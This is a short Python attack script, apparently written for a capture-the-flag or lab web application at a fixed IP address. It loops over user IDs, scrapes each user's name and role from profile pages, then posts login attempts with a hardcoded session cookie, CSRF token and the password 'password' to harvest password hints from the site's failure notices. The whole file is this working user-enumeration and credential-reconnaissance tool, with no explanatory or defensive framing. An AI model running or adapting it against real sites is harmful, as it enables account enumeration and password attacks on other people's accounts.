import requests
import re

ip = 'http://1.1.1.113/'

def GetUserById(id):
    response = (requests.get(ip + 'users/' +str(id)).text).strip()
    #http://1.1.1.113/send_pm?recipient_name=coderguy
    username = re.search('recipient_name=(.*?)"', response).group(1)
    return username

def GetRoleById(id):
    response = (requests.get(ip + 'users/' + str(id)).text).strip()
    role = re.search('>\x0A<b>\x0A(.*?)\x0A</b>', response).group(1)
    return role

def GetHintByID(id):
    username = GetUserById(id)
    cookie = { '_thirtytwo_session':'WGJPN0x6aG5Ha0JINVVUUG1wOUxJT3IrcVZzQ3N4ZStFbDNFcDA1YkVJVUpLeXFRYWU0WDVONllEeUF1S2gwYW0zK0txZGh4aGN2OXdZNG8rM01sZE4zZ3lvVlVxTkZYK3duSmdmQUpQek5pck85a3ZpL0trazJkZTF0S0E4QTRORy9NMFBDbGRuWkRDUzJmaVhFdEg3Sk5udXBBZUlPQlJ0NXo4M3pDVTZyck8zekJSZGE0aXlIKzdXZlo0SnA1Y1RPeTUwQklMMDlQOTNKTW9EbHArU2Erd3VWR2k5TTVhRFVoK29MK3R1MD0tLUwrSk94VHB3YlRLcXZvR3hmeFYyZnc9PQ==--9ed87de13732035176b7b4a34456e2fba42f8459'}
    payload = {'authenticity_token':'sDfq9weQumrr1boosZWzxf4RM3FpuBlbPjuNW+kFyyW8HILlLoor6agF2KOdACOvkZszCQh1rxoYicBXzm4MCA==',
               'session[name]':username,'session[password]':'password','commit':'Log+in'}
    response = (requests.post(ip + 'login/' , data=payload, cookies = cookie).text).strip()
    hint = re.search('notice\'>(.*?)<', response).group(1)
    return username,hint


for i in range(1,20):
    try:
        username, hint = GetHintByID(i)
        print(username + ":" + GetRoleById(i) + "\t" + hint)
    except:
        None
